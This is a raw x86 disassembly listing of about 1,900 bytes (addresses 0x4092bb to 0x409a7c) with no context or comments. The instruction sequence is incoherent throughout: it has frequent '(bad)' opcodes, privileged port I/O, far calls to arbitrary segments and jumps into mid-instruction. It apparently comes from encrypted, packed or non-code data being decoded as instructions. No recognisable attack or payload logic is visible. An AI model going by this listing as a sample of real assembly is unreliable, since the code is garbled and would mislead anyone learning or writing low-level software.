  4092bb:	mov    al,0x7c
  4092bd:	std    
  4092be:	fld    TBYTE PTR [ebx-0x412fb34f]
  4092c4:	mov    dh,0xef
  4092c6:	and    ch,al
  4092c8:	xor    eax,0x1e9718ec
  4092cd:	push   eax
  4092ce:	jno    0x4092a2
  4092d0:	push   edi
  4092d1:	shl    BYTE PTR [ebx],cl
  4092d3:	lahf   
  4092d4:	cmc    
  4092d5:	lods   eax,DWORD PTR ds:[esi]
  4092d6:	push   edx
  4092d7:	xor    bl,BYTE PTR [eax]
  4092d9:	call   0x3b48:0xa265030c
  4092e0:	daa    
  4092e1:	nop
  4092e2:	scas   eax,DWORD PTR es:[edi]
  4092e3:	aam    0xe7
  4092e5:	jmp    0x9feece91
  4092ea:	rcr    BYTE PTR ds:0xc4d393d,0x22
  4092f1:	jbe    0x4092ec
  4092f3:	sbb    dh,BYTE PTR [ebx+0x3288ad80]
  4092f9:	inc    esp
  4092fa:	sti    
  4092fb:	mov    ds:0xbddbb88a,al
  409300:	adc    BYTE PTR [ebx-0x41],bh
  409303:	jl     0x4092a8
  409305:	mov    al,ds:0x96fd6968
  40930a:	push   esp
  40930b:	loope  0x40930d
  40930d:	int    0xe4
  40930f:	call   DWORD PTR ds:0x3a4eeee8
  409315:	pop    eax
  409316:	mov    DWORD PTR [eax-0xb],ebp
  409319:	daa    
  40931a:	shr    BYTE PTR [eax-0x63],cl
  40931d:	mov    cl,0xa4
  40931f:	jp     0x4092e4
  409321:	adc    ah,BYTE PTR [ebp+0x5f39130b]
  409327:	dec    edi
  409328:	not    DWORD PTR ds:0x8d6265c2
  40932e:	loop   0x4092b3
  409330:	mov    ebp,0xfa1d161
  409335:	psllw  mm7,QWORD PTR [ebx]
  409338:	lods   eax,DWORD PTR ds:[esi]
  409339:	and    edi,DWORD PTR [ebx]
  40933b:	js     0x4093a2
  40933d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40933e:	and    edx,0xc4bd1c4c
  409344:	std    
  409345:	imul   eax,DWORD PTR [esi+0x1393a01d],0x4e
  40934c:	add    al,0x57
  40934e:	mov    esp,DWORD PTR [ecx-0x9]
  409351:	xchg   ebx,eax
  409352:	pop    ebp
  409353:	lods   al,BYTE PTR ds:[esi]
  409354:	add    bh,BYTE PTR [edi+ebp*2]
  409357:	fdiv   QWORD PTR [eax]
  409359:	pop    ds
  40935a:	aaa    
  40935b:	xchg   edx,eax
  40935c:	fidiv  DWORD PTR [edx-0x7f]
  40935f:	(bad)  
  409360:	fld    TBYTE PTR [edi+0x4d41497c]
  409366:	and    DWORD PTR [edx],ecx
  409368:	push   ebp
  409369:	dec    esp
  40936a:	push   cs
  40936b:	jb     0x4093ac
  40936d:	xchg   esi,eax
  40936e:	jo     0x4093c4
  409370:	xor    esp,edx
  409372:	xchg   ebx,eax
  409373:	out    dx,eax
  409374:	(bad)  
  409375:	mov    edx,0x92ec4342
  40937a:	out    0x6b,al
  40937c:	mov    al,ds:0x8c62c29
  409381:	inc    eax
  409382:	xchg   esi,eax
  409383:	xlat   BYTE PTR ds:[ebx]
  409384:	add    bl,bl
  409386:	cmp    BYTE PTR [eax],cl
  409388:	loope  0x4093f9
  40938a:	inc    ecx
  40938b:	loop   0x4093bd
  40938d:	fwait
  40938e:	inc    edi
  40938f:	jno    0x40939d
  409391:	inc    eax
  409392:	jns    0x409388
  409394:	arpl   bp,bx
  409396:	push   ss
  409397:	ret    
  409398:	dec    edi
  409399:	into   
  40939a:	mov    ebx,0x995c8fd7
  40939f:	xchg   DWORD PTR [ebx-0x3e],eax
  4093a2:	ja     0x40938d
  4093a4:	push   esp
  4093a5:	dec    esp
  4093a6:	js     0x409395
  4093a8:	pop    ds
  4093a9:	popa   
  4093aa:	test   eax,0x66741e3d
  4093af:	dec    ecx
  4093b0:	sahf   
  4093b1:	and    al,0xac
  4093b3:	pop    esp
  4093b4:	ins    DWORD PTR es:[edi],dx
  4093b5:	int    0x64
  4093b7:	xor    edx,DWORD PTR [eax]
  4093b9:	xchg   ebx,eax
  4093ba:	bound  esp,QWORD PTR [ecx-0x42]
  4093bd:	mov    eax,0xc7b24e30
  4093c2:	jnp    0x4093bc
  4093c4:	push   ds
  4093c5:	adc    BYTE PTR [ebx-0x3],ah
  4093c8:	inc    edx
  4093c9:	out    dx,eax
  4093ca:	push   es
  4093cb:	add    BYTE PTR [edi-0x4407b34f],0xf6
  4093d2:	jo     0x4093ba
  4093d4:	hlt    
  4093d5:	push   ds
  4093d6:	cmp    DWORD PTR [esi],0xffffffba
  4093d9:	mov    edi,0xc4587f28
  4093de:	lock jmp 0xa359e32
  4093e4:	lods   al,BYTE PTR ds:[esi]
  4093e5:	int3   
  4093e6:	jg     0x4093a5
  4093e8:	ret    
  4093e9:	sub    BYTE PTR [ebx-0x11],ch
  4093ec:	push   ds
  4093ed:	dec    eax
  4093ee:	fcom   DWORD PTR [ebp-0x22dfaa04]
  4093f4:	or     al,0xd7
  4093f6:	lea    eax,[eax-0x4e2345f7]
  4093fc:	push   ds
  4093fd:	sti    
  4093fe:	rol    BYTE PTR [esi+0xb5df7b2],1
  409404:	shl    BYTE PTR [edi],cl
  409406:	inc    esi
  409407:	mov    ebx,0x9c351f4
  40940c:	jg     0x40940b
  40940e:	add    eax,0x869013e3
  409413:	cdq    
  409414:	mov    esi,0x7559b44a
  409419:	(bad)
  40941d:	sbb    al,0x20
  40941f:	adc    eax,0xe0008f9f
  409424:	sbb    dh,BYTE PTR [eax-0x3805eea7]
  40942a:	sub    eax,eax
  40942c:	stos   DWORD PTR es:[edi],eax
  40942d:	adc    bl,BYTE PTR ss:[edi-0x5e]
  409431:	xchg   ecx,eax
  409432:	test   esi,eax
  409434:	push   0xd0b5d088
  409439:	xor    BYTE PTR [ebx-0x21],dl
  40943c:	inc    ecx
  40943d:	out    0x8d,eax
  40943f:	xchg   esi,eax
  409440:	fistp  DWORD PTR [edi]
  409442:	push   esi
  409443:	xor    eax,0x1d0b95ab
  409448:	stos   DWORD PTR es:[edi],eax
  409449:	retf   
  40944a:	sbb    al,0xc2
  40944c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40944d:	aad    0x4f
  40944f:	stos   BYTE PTR es:[edi],al
  409450:	pop    ds
  409451:	pusha  
  409452:	pop    ebx
  409453:	ror    BYTE PTR [ebx+0x62],cl
  409456:	push   cs
  409457:	push   eax
  409458:	psrld  mm1,mm5
  40945b:	adc    eax,DWORD PTR [edx]
  40945d:	retf   
  40945e:	leave  
  40945f:	xor    esp,DWORD PTR [ebp+0x443fc11a]
  409465:	pop    esp
  409466:	addr16 add eax,0x791e1ee4
  40946c:	jecxz  0x409491
  40946e:	inc    esp
  40946f:	pop    ds
  409470:	dec    edx
  409471:	cwde   
  409472:	pop    ss
  409473:	sbb    DWORD PTR [edx-0x76],esp
  409476:	les    esi,FWORD PTR fs:[ecx+0x6d00a987]
  40947d:	jne    0x40947b
  40947f:	add    al,0xae
  409481:	pop    edx
  409482:	push   ecx
  409483:	aam    0xaf
  409485:	test   eax,0x13ba020d
  40948a:	sbb    esi,DWORD PTR ds:0x18b583d9
  409490:	aad    0x22
  409492:	cmp    BYTE PTR [esi+0x10],0xe9
  409496:	mov    cl,0xea
  409498:	add    eax,DWORD PTR [esi+esi*1]
  40949b:	xchg   ebp,eax
  40949c:	pop    ds
  40949d:	inc    esi
  40949e:	jne    0x40942e
  4094a0:	out    dx,eax
  4094a1:	fcomp  QWORD PTR [edi+edx*4]
  4094a4:	and    edi,DWORD PTR [esi+0x51]
  4094a7:	icebp  
  4094a8:	xchg   dh,dh
  4094aa:	lods   eax,DWORD PTR ds:[esi]
  4094ab:	add    al,0xb5
  4094ad:	(bad)  
  4094ae:	mov    al,0x93
  4094b0:	test   al,0x57
  4094b2:	popf   
  4094b3:	test   al,0xa4
  4094b5:	jle    0x409525
  4094b7:	xor    bh,ch
  4094b9:	xchg   ecx,eax
  4094ba:	jns    0x409490
  4094bc:	mov    ch,0x17
  4094be:	jl     0x40951b
  4094c0:	cmp    al,0x8b
  4094c2:	cwde   
  4094c3:	popf   
  4094c4:	lods   al,BYTE PTR ds:[esi]
  4094c5:	into   
  4094c6:	outs   dx,DWORD PTR ds:[esi]
  4094c7:	out    dx,eax
  4094c8:	arpl   WORD PTR [ecx],bx
  4094ca:	push   ebx
  4094cb:	cmp    eax,0x1c4a57c1
  4094d0:	push   esp
  4094d1:	push   eax
  4094d2:	(bad)  [edx+0x61]
  4094d5:	mov    esi,0x1b2abca2
  4094da:	and    ch,BYTE PTR [ecx-0x2]
  4094dd:	or     BYTE PTR [eax-0x71995604],dl
  4094e3:	add    BYTE PTR [ebx+eax*2+0x54],bh
  4094e7:	cld    
  4094e8:	adc    ch,BYTE PTR ds:0x2f142602
  4094ee:	inc    ebp
  4094ef:	xor    edi,ebp
  4094f1:	and    BYTE PTR ds:0xa68acafb,ah
  4094f7:	pop    es
  4094f8:	arpl   bp,bp
  4094fa:	inc    edx
  4094fb:	into   
  4094fc:	inc    ebp
  4094fd:	fild   DWORD PTR [edi]
  4094ff:	jl     0x4094a5
  409501:	fsub   st,st(1)
  409503:	xchg   edi,eax
  409504:	(bad)  
  409505:	stc    
  409506:	xchg   ecx,eax
  409507:	dec    eax
  409508:	fptan  
  40950a:	lds    edi,FWORD PTR [edx-0xaad1fb]
  409510:	mov    eax,ds:0xa090e173
  409515:	xor    DWORD PTR [ecx],ecx
  409517:	sbb    ecx,edi
  409519:	xor    eax,0x38e6b069
  40951e:	mov    edx,0xba3dc17c
  409523:	mov    eax,ds:0xa88f503f
  409528:	jne    0x409553
  40952a:	ins    BYTE PTR es:[edi],dx
  40952b:	sub    eax,0xcc12a57b
  409530:	inc    eax
  409531:	dec    eax
  409532:	mov    ds:0x4122b6f4,eax
  409537:	cmp    al,0x81
  409539:	gs pop eax
  40953b:	cld    
  40953c:	int3   
  40953d:	aam    0x61
  40953f:	inc    edi
  409540:	or     bh,bh
  409542:	ja     0x40959f
  409544:	popf   
  409545:	mov    esi,0xd815cb71
  40954a:	sub    esi,DWORD PTR [edi+ebp*2]
  40954d:	test   DWORD PTR [esi-0x7d9e76e2],ebp
  409553:	jl     0x4095bf
  409555:	shl    DWORD PTR [ecx-0x130b614b],cl
  40955b:	dec    ecx
  40955c:	add    eax,0x4a4f3585
  409561:	(bad)  
  409562:	loopne 0x40959f
  409564:	out    dx,eax
  409565:	les    esi,FWORD PTR [esi+0x33b2a609]
  40956b:	lods   eax,DWORD PTR ds:[esi]
  40956c:	push   ss
  40956d:	stc    
  40956e:	pop    ds
  40956f:	out    dx,eax
  409570:	jbe    0x40954b
  409572:	adc    ecx,DWORD PTR [ecx-0x73d4698e]
  409578:	pop    ebp
  409579:	ffree  st(0)
  40957b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40957c:	arpl   WORD PTR [esi-0x3b279c1d],sp
  409582:	daa    
  409583:	xchg   ecx,eax
  409584:	enter  0x57e9,0x7
  409588:	mov    esi,DWORD PTR [eax-0x2d0729fb]
  40958e:	xchg   edi,eax
  40958f:	jmp    0xa43e6d3b
  409594:	pop    ecx
  409595:	adc    esi,DWORD PTR [edi+esi*1-0x36]
  409599:	in     eax,dx
  40959a:	test   BYTE PTR [ecx],bh
  40959c:	adc    al,0x3a
  40959e:	mov    ebx,0x685b5ffe
  4095a3:	fwait
  4095a4:	aaa    
  4095a5:	push   esp
  4095a6:	jbe    0x4095c3
  4095a8:	in     al,0xb1
  4095aa:	xchg   BYTE PTR [eax],dl
  4095ac:	lods   al,BYTE PTR ds:[esi]
  4095ad:	out    dx,eax
  4095ae:	stc    
  4095af:	iret   
  4095b0:	(bad)  
  4095b1:	repnz cmp BYTE PTR [eax+0x22132abd],bh
  4095b8:	sar    BYTE PTR [ebp+0x25],0xd7
  4095bc:	pop    esi
  4095bd:	pop    es
  4095be:	ret    0xe354
  4095c1:	push   esi
  4095c2:	shl    DWORD PTR [ecx],1
  4095c4:	repz mov cs,WORD PTR [ebx]
  4095c7:	add    ecx,DWORD PTR [edi+0x33]
  4095ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095cb:	icebp  
  4095cc:	xchg   edx,eax
  4095cd:	stos   DWORD PTR es:[edi],eax
  4095ce:	dec    esi
  4095cf:	mov    ecx,0x732f57ca
  4095d4:	(bad)  
  4095d5:	cdq    
  4095d6:	div    DWORD PTR [edi]
  4095d8:	je     0x409640
  4095da:	or     eax,0x16522b48
  4095df:	add    BYTE PTR [ebp+eax*1-0x5c],bl
  4095e3:	fs das 
  4095e5:	mov    dh,0x78
  4095e7:	(bad)  
  4095e9:	lock and eax,0xedb900a
  4095ef:	fsub   DWORD PTR [ebp+0x69]
  4095f2:	inc    edx
  4095f3:	add    al,BYTE PTR [edx-0x18]
  4095f6:	pop    ebp
  4095f7:	xchg   DWORD PTR [edx+0x3d65f9e5],ecx
  4095fd:	adc    ecx,DWORD PTR [ecx+ecx*2]
  409600:	outs   dx,BYTE PTR ds:[esi]
  409601:	enter  0x34e2,0x9c
  409605:	xchg   esi,eax
  409606:	jmp    0x9519:0xffd8ecbf
  40960d:	xor    eax,0xba956734
  409612:	mov    es,WORD PTR [edi]
  409614:	int3   
  409615:	bound  eax,QWORD PTR [edx]
  409617:	fild   DWORD PTR [edi-0x2c]
  40961a:	inc    edi
  40961b:	psllq  mm2,QWORD PTR [ebx-0x2a]
  40961f:	ins    DWORD PTR es:[edi],dx
  409620:	(bad)  
  409621:	cmp    eax,0x7a45a7e9
  409626:	sbb    eax,esi
  409628:	test   BYTE PTR [ecx-0x2b854278],ah
  40962e:	mov    dh,0x34
  409630:	rcr    cl,0xe2
  409633:	cdq    
  409634:	mul    DWORD PTR [ebx+0x71]
  409637:	ins    DWORD PTR es:[edi],dx
  409638:	cdq    
  409639:	test   BYTE PTR [edi],bl
  40963b:	pusha  
  40963c:	pop    esi
  40963d:	imul   ebp,ebp,0x4ee35f81
  409643:	cmp    BYTE PTR [ecx-0x4d],al
  409646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409647:	mov    ah,0xcf
  409649:	in     eax,dx
  40964a:	jl     0x40962e
  40964c:	repnz pushf 
  40964e:	rcl    DWORD PTR [ebp+0x6f8d7790],cl
  409654:	adc    edx,DWORD PTR [edx]
  409656:	mov    ch,0x74
  409658:	mov    eax,DWORD PTR [ebx-0x7c]
  40965b:	pop    ds
  40965c:	inc    edx
  40965d:	mov    al,ds:0x2f58846a
  409662:	or     bh,BYTE PTR [edx]
  409664:	and    eax,0xb95d7659
  409669:	stos   BYTE PTR es:[edi],al
  40966a:	sub    BYTE PTR [edx],bh
  40966c:	push   ds
  40966d:	clc    
  40966e:	mov    al,0xd8
  409670:	retf   
  409671:	mov    ds:0x2534000,eax
  409676:	int    0xc6
  409678:	or     al,0xf3
  40967a:	cmp    BYTE PTR [eax],cl
  40967c:	sbb    ecx,DWORD PTR [ebp+0x28c0e1c]
  409682:	call   FWORD PTR [esp+eax*4+0x31]
  409686:	mov    ecx,0x7087c984
  40968b:	sar    esi,cl
  40968d:	call   0x221aba5e
  409692:	adc    al,0x11
  409694:	and    ah,ah
  409696:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409697:	shr    DWORD PTR [edi+0x36],0xda
  40969b:	popf   
  40969c:	call   0x2966:0x52554a10
  4096a3:	push   ecx
  4096a4:	repz hlt 
  4096a6:	(bad)  
  4096a7:	xor    BYTE PTR [ebp-0x61],bh
  4096aa:	xchg   edi,eax
  4096ab:	xchg   edx,eax
  4096ac:	mov    bh,0x2c
  4096ae:	jbe    0x409659
  4096b0:	pop    edi
  4096b1:	cmp    bh,dl
  4096b3:	retf   
  4096b4:	jno    0x409691
  4096b6:	xchg   esp,eax
  4096b7:	push   edx
  4096b8:	dec    edx
  4096b9:	mov    edi,0xfaebe176
  4096be:	xor    al,0x85
  4096c0:	(bad)  
  4096c1:	jge    0x409706
  4096c3:	cmp    dh,BYTE PTR ds:0x1e299796
  4096c9:	out    0x91,al
  4096cb:	pushf  
  4096cc:	sbb    ah,BYTE PTR [esi]
  4096ce:	xchg   ebx,eax
  4096cf:	jo     0x4096be
  4096d1:	call   0x3640:0x2dac8bb4
  4096d8:	daa    
  4096d9:	mov    bl,0xbb
  4096db:	add    al,0x3c
  4096dd:	and    al,0x8c
  4096df:	jp     0x40974e
  4096e1:	jno    0x409680
  4096e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096e4:	mov    ch,0xaa
  4096e6:	push   esi
  4096e7:	lods   al,BYTE PTR ds:[esi]
  4096e8:	dec    ecx
  4096e9:	xor    eax,0x76de0995
  4096ee:	aaa    
  4096ef:	jle    0x2749c030
  4096f5:	push   edx
  4096f6:	add    dl,bl
  4096f8:	mov    ds:0x3130cf1b,al
  4096fd:	sbb    al,0xce
  4096ff:	rol    DWORD PTR [eax+0x12],cl
  409702:	bound  ebp,QWORD PTR [ebp+0x79f27ed9]
  409708:	mov    bh,0xc5
  40970a:	mov    eax,ds:0x42610cd6
  40970f:	adc    BYTE PTR [edi+ebx*4-0x703e3ce4],cl
  409716:	mov    BYTE PTR [edx+edi*1-0x3a],ah
  40971a:	cmp    BYTE PTR [edx],bl
  40971c:	leave  
  40971d:	sahf   
  40971e:	btc    DWORD PTR [eax],eax
  409721:	sub    eax,0x8cb02f8f
  409726:	sub    BYTE PTR [ebx],al
  409728:	xchg   BYTE PTR [esi],dh
  40972a:	inc    edi
  40972b:	push   edx
  40972c:	lods   eax,DWORD PTR ds:[esi]
  40972d:	aad    0xb7
  40972f:	dec    esp
  409730:	lock sub BYTE PTR [ecx-0x68699057],0x50
  409738:	(bad)  
  409739:	int3   
  40973a:	imul   DWORD PTR [ecx-0x76]
  40973d:	leave  
  40973e:	sub    DWORD PTR [ebx+0xd36112e],ecx
  409744:	xor    al,0x71
  409746:	sbb    al,0x91
  409748:	and    BYTE PTR [edi],bl
  40974a:	ins    DWORD PTR es:[edi],dx
  40974b:	mov    edx,0xaec00b8a
  409750:	xlat   BYTE PTR ds:[ebx]
  409751:	leave  
  409752:	jle    0x4096da
  409754:	(bad)  
  409755:	call   0x2247f266
  40975a:	mov    ebx,0x36812ba1
  40975f:	aam    0xe9
  409761:	int3   
  409762:	cmp    bl,BYTE PTR [esi+0x43]
  409765:	cli    
  409766:	mov    ebp,0x4f076b7a
  40976b:	jecxz  0x409786
  40976d:	sbb    edi,DWORD PTR [edx-0x2ce08ca3]
  409773:	repz sub BYTE PTR [esp+esi*8+0x1a],0xf
  409779:	cmp    ebx,DWORD PTR [ebp+0x2400af0]
  40977f:	xchg   DWORD PTR [esi+ebp*4],edi
  409782:	fild   QWORD PTR [ebp+0x2e]
  409785:	loope  0x4097ee
  409787:	inc    ebx
  409788:	mov    edi,ds
  40978a:	pusha  
  40978b:	out    0x1b,al
  40978d:	inc    ebx
  40978e:	nop
  40978f:	or     al,0xb8
  409791:	rcr    DWORD PTR [eax+0x2d],0xff
  409795:	sub    dh,BYTE PTR [esi]
  409797:	out    dx,al
  409798:	jecxz  0x40979e
  40979a:	inc    edx
  40979b:	out    dx,al
  40979c:	cmp    BYTE PTR [eax],dh
  40979e:	push   ebx
  40979f:	fmul   QWORD PTR [ebx+0x568de8de]
  4097a5:	sub    eax,0xfeaa09d1
  4097aa:	sbb    al,0x4c
  4097ac:	fs pop esp
  4097ae:	jo     0x409758
  4097b0:	add    ebx,DWORD PTR [ecx-0x207f4a61]
  4097b6:	scas   al,BYTE PTR es:[edi]
  4097b7:	test   al,0x3a
  4097b9:	mov    BYTE PTR [eax],0xeb
  4097bc:	stos   DWORD PTR es:[edi],eax
  4097bd:	ror    eax,cl
  4097bf:	idiv   esi
  4097c1:	xchg   DWORD PTR [eax],ebx
  4097c3:	xor    dh,0x43
  4097c6:	in     eax,dx
  4097c7:	inc    ebx
  4097c8:	cmc    
  4097c9:	pop    eax
  4097ca:	aam    0x91
  4097cc:	add    ecx,edi
  4097ce:	call   0x38039354
  4097d3:	pop    es
  4097d4:	test   DWORD PTR [edi-0x14c4d1cc],esi
  4097da:	mov    edi,0x61c95d4c
  4097df:	sahf   
  4097e0:	loop   0x40985f
  4097e2:	sub    BYTE PTR [ebp-0x69],0xa5
  4097e6:	dec    ebx
  4097e7:	and    ebx,ecx
  4097e9:	std    
  4097ea:	xchg   esi,eax
  4097eb:	add    edx,eax
  4097ed:	fwait
  4097ee:	push   cs
  4097ef:	aam    0x9
  4097f1:	fnstcw WORD PTR [ecx+0x9]
  4097f4:	call   0x18e0ff3d
  4097f9:	adc    BYTE PTR [esp+ebp*1-0x1],ah
  4097fd:	xor    DWORD PTR [ecx+ecx*8-0x2e],esi
  409801:	xchg   BYTE PTR [ebx+0x125f9a91],dl
  409807:	fs retf 0xa10a
  40980b:	lds    edx,FWORD PTR [eax]
  40980d:	mov    edx,0x7273cbf4
  409812:	ror    BYTE PTR [eax-0x71],cl
  409815:	push   cs
  409816:	adc    DWORD PTR [ecx-0x26044644],ebx
  40981c:	inc    ecx
  40981d:	mov    bl,0x3d
  40981f:	pop    edi
  409820:	jbe    0x4097de
  409822:	cwde   
  409823:	mov    eax,ds:0xe8982909
  409828:	mov    cl,0x85
  40982a:	mov    ah,bh
  40982c:	adc    BYTE PTR ds:[edx+ebx*8-0x24],dh
  409831:	stos   BYTE PTR es:[edi],al
  409832:	popf   
  409833:	adc    BYTE PTR [edx+0x54],ah
  409836:	pop    ebp
  409837:	pusha  
  409838:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409839:	sub    ebp,DWORD PTR [ebp-0x31b6426e]
  40983f:	sbb    BYTE PTR [eax],ah
  409841:	dec    ebx
  409842:	(bad)  
  409843:	pusha  
  409844:	mov    eax,ds:0x42a5eafd
  409849:	pop    ds
  40984a:	fldcw  WORD PTR [ebp+0x4d9d00a1]
  409850:	out    dx,eax
  409851:	adc    al,0x54
  409853:	fld    QWORD PTR ds:[eax-0x1c8eb8c2]
  40985a:	mov    ecx,0x709608c0
  40985f:	jb     0x4098da
  409861:	out    dx,al
  409862:	jb     0x409829
  409864:	adc    BYTE PTR [edi],al
  409866:	mov    eax,0x2aa880d1
  40986b:	or     al,BYTE PTR [edx-0x3c6f7701]
  409871:	mov    edi,0x70248e48
  409876:	or     eax,0x1f0adb89
  40987b:	in     al,0xb6
  40987d:	sub    dh,0x58
  409880:	adc    edx,DWORD PTR [ebp-0x3e]
  409883:	aad    0xb1
  409885:	cmp    DWORD PTR [edx-0x1a],0x52000050
  40988c:	mov    ds:0x1f32837f,al
  409891:	ficom  WORD PTR [edx+0x12]
  409894:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409895:	dec    ecx
  409896:	push   ebp
  409897:	and    eax,0xad7332b2
  40989c:	push   eax
  40989d:	mov    bl,0xdf
  40989f:	(bad)  
  4098a0:	or     eax,0x5ab14e79
  4098a5:	je     0x409916
  4098a7:	fidivr DWORD PTR [eax+ebp*8]
  4098aa:	sbb    BYTE PTR [esi-0x7b8e96fd],dl
  4098b0:	enter  0x90,0xf8
  4098b4:	aad    0x4c
  4098b6:	mov    ebp,0xbb5eaab2
  4098bb:	call   0x9d23:0x8c78b0e0
  4098c2:	mov    ah,0xa1
  4098c4:	in     eax,0xc2
  4098c6:	es cmp cl,ah
  4098c9:	(bad)  gs:[ebx-0x50]
  4098cd:	or     BYTE PTR [edi],cl
  4098cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098d0:	push   ecx
  4098d1:	or     ebp,DWORD PTR [edi]
  4098d3:	cmp    eax,edi
  4098d5:	into   
  4098d6:	repnz mov edx,0x187fef48
  4098dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098dd:	add    ch,BYTE PTR [ecx]
  4098df:	sbb    DWORD PTR gs:[edi-0xe8fd7d5],ebx
  4098e6:	lds    eax,FWORD PTR [esi]
  4098e8:	faddp  st(5),st
  4098ea:	dec    edx
  4098eb:	sahf   
  4098ec:	daa    
  4098ed:	pushf  
  4098ee:	push   ebp
  4098ef:	jl     0x4098fa
  4098f1:	test   DWORD PTR [ebp+0x3a3742bc],0x685c16a8
  4098fb:	and    al,0x32
  4098fd:	(bad)  
  4098fe:	dec    ebx
  4098ff:	sub    DWORD PTR [ebp-0x57],ecx
  409902:	inc    ecx
  409903:	sub    edx,ebx
  409905:	repz call 0xfe9f:0xe3ddc6c8
  40990d:	fadd   DWORD PTR [eax+0x2f473b11]
  409913:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409914:	adc    DWORD PTR [esi+esi*4-0x494d52cb],0xfffffff2
  40991c:	(bad)  
  40991d:	in     al,dx
  40991e:	fnsave [edx+0x8afcee3]
  409924:	dec    esi
  409925:	inc    edx
  409926:	out    0xcc,eax
  409928:	mov    edx,0xbc2d0bb7
  40992d:	or     al,0x63
  40992f:	and    DWORD PTR [ebp+0x23],esp
  409932:	push   esi
  409933:	test   BYTE PTR [edi-0xca0ffb0],dh
  409939:	cld    
  40993a:	aam    0x9e
  40993c:	mov    al,ds:0x7856ac62
  409941:	ins    DWORD PTR es:[edi],dx
  409942:	mov    esi,0x3102f553
  409947:	iret   
  409948:	inc    ebx
  409949:	push   cs
  40994a:	ret    
  40994b:	dec    esi
  40994c:	aaa    
  40994d:	bound  edi,QWORD PTR [edx]
  40994f:	xor    al,0xd6
  409951:	bnd jne 0x4098ed
  409954:	cli    
  409955:	and    bl,BYTE PTR [ebx-0x5a]
  409958:	jnp    0x4098e7
  40995a:	push   es
  40995b:	cmp    BYTE PTR [eax-0x4b],0x9d
  40995f:	(bad)  [eax+0x27ad956d]
  409965:	in     eax,dx
  409966:	pushf  
  409967:	enter  0xfa01,0xdc
  40996b:	frstor [eax-0x25]
  40996e:	pop    ds
  40996f:	xlat   BYTE PTR ds:[ebx]
  409970:	sub    eax,0xc77c0b02
  409975:	mov    BYTE PTR [edi+0x15],bh
  409978:	push   esp
  409979:	dec    eax
  40997a:	mov    DWORD PTR [esi-0x79],edx
  40997d:	mov    al,ds:0x1b247b5a
  409982:	gs loop 0x4099df
  409985:	add    BYTE PTR [esi+ecx*8],ah
  409988:	retf   
  409989:	add    BYTE PTR [edi+edx*1+0x34460f6a],cl
  409990:	push   esp
  409991:	inc    ebp
  409992:	out    dx,eax
  409993:	fsubr  DWORD PTR [edi-0x162f6f3b]
  409999:	mov    al,0x9
  40999b:	gs jecxz 0x4099b0
  40999e:	push   ds
  40999f:	rcr    BYTE PTR [edx+eiz*4+0x9e4ef2e],cl
  4099a6:	and    DWORD PTR [ecx+ebp*2],ecx
  4099a9:	push   esi
  4099aa:	xchg   esi,eax
  4099ab:	shl    ecx,0xcc
  4099ae:	sub    DWORD PTR [ebx-0x2f],esp
  4099b1:	sbb    edi,ebp
  4099b3:	and    al,0x95
  4099b5:	cmp    cl,BYTE PTR [edx]
  4099b7:	arpl   WORD PTR [esi-0x2],bp
  4099ba:	sbb    eax,0x519cdab0
  4099bf:	fldcw  WORD PTR [ebp-0x24cca4ca]
  4099c5:	sub    al,0x47
  4099c7:	test   esi,0x829cb1b2
  4099cd:	lods   al,BYTE PTR ds:[esi]
  4099ce:	dec    eax
  4099cf:	push   esi
  4099d0:	cmp    DWORD PTR [ecx+0x67eba9dc],ecx
  4099d6:	mov    edi,0xabd40b65
  4099db:	cmc    
  4099dc:	cdq    
  4099dd:	add    eax,0x5bca220a
  4099e2:	repnz or WORD PTR [esi],bx
  4099e6:	lds    ebx,FWORD PTR [ecx]
  4099e8:	or     DWORD PTR [ebx-0x567c6d83],ebp
  4099ee:	daa    
  4099ef:	adc    ebx,DWORD PTR [esi]
  4099f1:	mov    cl,0xd2
  4099f3:	inc    ebp
  4099f4:	or     esi,0xfffffff4
  4099f7:	mov    esi,0x45454f0d
  4099fc:	imul   ebx,DWORD PTR [ecx+0x1d],0xb42897da
  409a03:	add    al,0xe3
  409a05:	(bad)  
  409a06:	mov    ch,0xa4
  409a08:	inc    edi
  409a09:	adc    BYTE PTR [ecx-0x28c16226],bh
  409a0f:	rcl    BYTE PTR [edi*8+0x31b79d0],0x53
  409a17:	sub    DWORD PTR [edx],esp
  409a19:	sub    DWORD PTR [eax-0x6e6a0868],ecx
  409a1f:	lods   al,BYTE PTR ds:[esi]
  409a20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a21:	push   cs
  409a22:	nop
  409a23:	cmp    eax,0x94a9f0ab
  409a28:	fdivp  st(2),st
  409a2a:	inc    eax
  409a2b:	js     0x4099f3
  409a2d:	das    
  409a2e:	jnp    0x409a84
  409a30:	andps  xmm0,XMMWORD PTR cs:[eax+0xa43648f]
  409a38:	int3   
  409a39:	xchg   edx,eax
  409a3a:	into   
  409a3b:	push   ebp
  409a3c:	aaa    
  409a3d:	jbe    0x409aac
  409a3f:	test   eax,0x233eb0ca
  409a44:	out    0xff,al
  409a46:	icebp  
  409a47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a48:	jle    0x409a67
  409a4a:	or     al,0xee
  409a4c:	daa    
  409a4d:	jne    0x409ace
  409a4f:	push   cs
  409a50:	sbb    eax,0x9e358ba4
  409a55:	inc    edi
  409a56:	in     eax,dx
  409a57:	mov    al,ds:0xd9b1ca84
  409a5c:	sbb    BYTE PTR [esp+eax*4+0x37c966e6],al
  409a63:	pop    ebp
  409a64:	imul   edi,edx,0x30
  409a67:	inc    ebp
  409a68:	popa   
  409a69:	and    BYTE PTR [ebp+0x7d5ee4fe],cl
  409a6f:	aaa    
  409a70:	das    
  409a71:	push   0xb1a84cae
  409a76:	not    bl
  409a78:	and    al,0x16
  409a7a:	(bad)  
  409a7b:	out    dx,al
  409a7c:	(bad)  
